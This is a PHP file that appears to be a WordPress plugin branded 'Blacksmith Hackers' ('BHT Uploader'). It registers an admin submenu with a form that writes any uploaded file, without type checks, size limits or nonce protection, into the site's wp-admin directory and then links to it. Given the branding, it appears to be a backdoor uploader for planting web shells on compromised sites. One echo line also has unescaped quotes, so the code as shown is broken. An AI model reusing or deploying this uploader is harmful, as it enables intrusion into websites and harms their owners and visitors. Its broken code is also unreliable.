<?php

// Registering Sub Menu 

add_action('admin_menu', 'submenu_page');

function submenu_page() {
	add_submenu_page( 'bht_uploader', 'BHT Uploader', 'Uploader', 'administrator', 'bht_file', 'submenu_page_callback' );
}


// Working On Sub Menu Functions

function submenu_page_callback(){
        main_function();
?>

<?php

}
function main_function(){

  echo '
	<div style="margin-top:50px;" align="center">
		<img src="http://s1.directupload.net/images/130831/2xlwno8m.png" width="20%" height="auto"/>
		<h1>Blacksmith Hackers</h1>
	</div>';

	if(isset($_POST['Submit'])){
		$filedir = ""; 
		$maxfile = '2000000';
		$userfile_name = $_FILES['image']['name'];
		$userfile_tmp = $_FILES['image']['tmp_name'];
    if (isset($_FILES['image']['name'])) {
        $abod = $filedir.$userfile_name;
        @move_uploaded_file($userfile_tmp, $abod);
  	$homelink=get_home_url();
	echo "<center><b>Done</br>Go Here ::: <a href="$homelink/wp-admin/$userfile_name">$homelink/wp-admin/$userfile_name</a></b></center>";
	}
	}
	else{
		echo'
		<div style="margin-top:10px;" align="center"><form method="POST" action="" enctype="multipart/form-data"><input type="file" name="image"><input type="Submit" name="Submit" value="Submit"></form></div>';
	}

}
